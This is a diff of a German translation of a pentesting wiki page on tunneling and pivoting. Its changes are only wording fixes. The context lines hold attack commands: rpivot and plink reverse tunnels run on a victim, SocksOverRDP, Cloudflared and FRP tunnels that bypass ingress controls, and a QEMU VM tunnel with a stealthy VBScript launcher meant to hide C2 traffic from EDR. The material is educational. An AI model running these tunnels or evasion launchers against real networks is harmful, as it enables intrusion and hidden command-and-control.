@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Durch **NTLM-Proxy** pivotieren
+Pivotieren durch **NTLM-Proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es ist wie eine Konsolen-PuTTY-Version (die Optionen sind sehr ähnlich zu einem ssh-Client).
 
-Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung haben können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
+Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -360,11 +360,11 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Jetzt können wir über **RDP** mit dem **Opfer** über **`mstsc.exe`** **verbinden**, und wir sollten eine **Aufforderung** erhalten, die besagt, dass das **SocksOverRDP-Plugin aktiviert ist**, und es wird auf **127.0.0.1:1080** **lauschen**.
 
-**Verbinden** Sie sich über **RDP** und laden Sie die `SocksOverRDP-Server.exe`-Binärdatei auf dem Opfergerät hoch und führen Sie sie aus:
+**Verbinden** Sie sich über **RDP** und laden Sie die `SocksOverRDP-Server.exe`-Binärdatei auf dem Opfercomputer hoch und führen Sie sie aus:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Bestätigen Sie jetzt auf Ihrem Gerät (Angreifer), dass der Port 1080 lauscht:
+Bestätigen Sie jetzt auf Ihrer Maschine (Angreifer), dass der Port 1080 lauscht:
 ```
 netstat -antb | findstr 1080
 ```
@@ -388,7 +388,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Es authentifiziert sich gegen einen Proxy und bindet einen Port lokal, der an den externen Dienst weitergeleitet wird, den Sie angeben. Dann können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
-Zum Beispiel den weitergeleiteten Port 443
+Zum Beispiel, um den Port 443 weiterzuleiten.
 ```
 Username Alice
 Password P@ssw0rd
@@ -401,7 +401,7 @@ Sie könnten auch einen **meterpreter** verwenden, der sich mit localhost:443 ve
 
 ## YARP
 
-Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden es hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -459,7 +459,7 @@ Proxychains intercepts `gethostbyname` libc call und tunnelt TCP-DNS-Anfragen du
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
+Root wird in beiden Systemen benötigt, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -570,11 +570,11 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-Starten Sie den Connector:
+Starte den Connector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Weil der gesamte Verkehr den Host **ausgehend über 443** verlässt, sind Cloudflared-Tunnel eine einfache Möglichkeit, um Ingress-ACLs oder NAT-Grenzen zu umgehen. Beachten Sie, dass die Binärdatei normalerweise mit erhöhten Rechten ausgeführt wird – verwenden Sie Container oder das `--user`-Flag, wenn möglich.
+Weil der gesamte Verkehr den Host **ausgehend über 443** verlässt, sind Cloudflared-Tunnel eine einfache Möglichkeit, um Eingangs-ACLs oder NAT-Grenzen zu umgehen. Beachten Sie, dass die Binärdatei normalerweise mit erhöhten Rechten ausgeführt wird – verwenden Sie Container oder das `--user`-Flag, wenn möglich.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -599,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Verwendung des neuen SSH-Gateways (kein frpc-Binär)
+### Verwendung des neuen SSH-Gateways (kein frpc-Binärdatei)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -612,7 +612,7 @@ Der obige Befehl veröffentlicht den Port des Opfers **8080** als **attacker_ip:
 
 ## Verdeckte VM-basierte Tunnel mit QEMU
 
-QEMU’s Benutzer-Modus-Netzwerk (`-netdev user`) unterstützt eine Option namens `hostfwd`, die **einen TCP/UDP-Port auf dem *Host* bindet und in das *Gast*-System weiterleitet**. Wenn das Gast-System einen vollständigen SSH-Daemon ausführt, bietet die hostfwd-Regel eine disposable SSH-Jump-Box, die vollständig innerhalb einer flüchtigen VM lebt – perfekt, um C2-Verkehr vor EDR zu verbergen, da alle bösartigen Aktivitäten und Dateien auf der virtuellen Festplatte bleiben.
+QEMUs Benutzer-Modus-Netzwerk (`-netdev user`) unterstützt eine Option namens `hostfwd`, die **einen TCP/UDP-Port auf dem *Host* bindet und in das *Gast* weiterleitet**. Wenn das Gast eine vollständige SSH-Daemon ausführt, bietet die hostfwd-Regel Ihnen eine disposable SSH-Jump-Box, die vollständig innerhalb einer ephemeral VM lebt – perfekt, um C2-Verkehr vor EDR zu verbergen, da alle bösartigen Aktivitäten und Dateien auf der virtuellen Festplatte bleiben.
 
 ### Schnelle Einzeiler
 ```powershell
@@ -628,7 +628,7 @@ qemu-system-x86_64.exe ^
 • Der Port **2222/tcp** auf dem Windows-Host wird transparent an **22/tcp** im Gast weitergeleitet.  
 • Aus der Sicht des Angreifers stellt das Ziel einfach den Port 2222 zur Verfügung; alle Pakete, die ihn erreichen, werden vom SSH-Server, der in der VM läuft, verarbeitet.  
 
-### Stealthy Start über VBScript
+### Stealthy über VBScript starten
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
 Set o = CreateObject("Wscript.Shell")
@@ -653,7 +653,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### Warum dies die Erkennung umgeht
 
 • Nur zwei nicht signierte ausführbare Dateien (`qemu-system-*.exe`) berühren die Festplatte; keine Treiber oder Dienste sind installiert.  
-• Sicherheitsprodukte auf dem Host sehen **harmlosen Loopback-Verkehr** (das tatsächliche C2 endet innerhalb der VM).  
+• Sicherheitsprodukte auf dem Host sehen **harmlosen Loopback-Verkehr** (der tatsächliche C2 endet innerhalb der VM).  
 • Speicherscanner analysieren niemals den bösartigen Prozessspeicher, da er in einem anderen OS lebt.
 
 ### Defender-Tipps
@@ -666,11 +666,11 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 ## Andere Tools zur Überprüfung
 
-- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
-- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)  
+- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)  
 
 ## Referenzen
 
-- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
 
 {{#include ../banners/hacktricks-training.md}}
